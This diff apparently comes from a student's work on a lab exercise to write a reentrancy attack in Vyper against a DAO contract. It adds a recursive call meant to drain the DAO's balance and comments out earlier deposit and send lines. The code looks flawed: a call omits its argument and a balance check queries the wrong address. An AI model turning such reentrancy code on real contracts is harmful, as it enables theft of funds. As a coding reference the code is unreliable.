@@ -39,6 +39,9 @@ def attack(dao_address:address):
     DAO(dao_address).deposit(value = deposit_amount)
     
     # TODO: Start the reentrancy attack
+     if (DAO(self.dao_address).userBalances(self.dao_address) < 10000):
+        self.attack()
+
     self._attack() # I want to do while loop here, but seems Vyper has no while loop
 
     # TODO: After the recursion has finished, all the stolen funds are held by this contract. Now, you need to send all funds (deposited and stolen) to the entity that called this contract
@@ -64,11 +67,9 @@ def __default__():
         self._attack()
     
     self._attack()
-    self._attack()
-    DAO(self.owner_address).deposit(value = msg.value)
-    DAO(msg.sender).deposit(value = msg.value)
-    DAO(self.owner_address).deposit(value = msg.value)
-    DAO(msg.sender).deposit(value = msg.value)
-    
-    
-    send(msg.sender, msg.value)
+    #self._attack()
+    #DAO(self.owner_address).deposit(value = msg.value)
+    #DAO(msg.sender).deposit(value = msg.value)
+    #DAO(self.owner_address).deposit(value = msg.value)
+    #DAO(msg.sender).deposit(value = msg.value)
+    #send(msg.sender, msg.value)
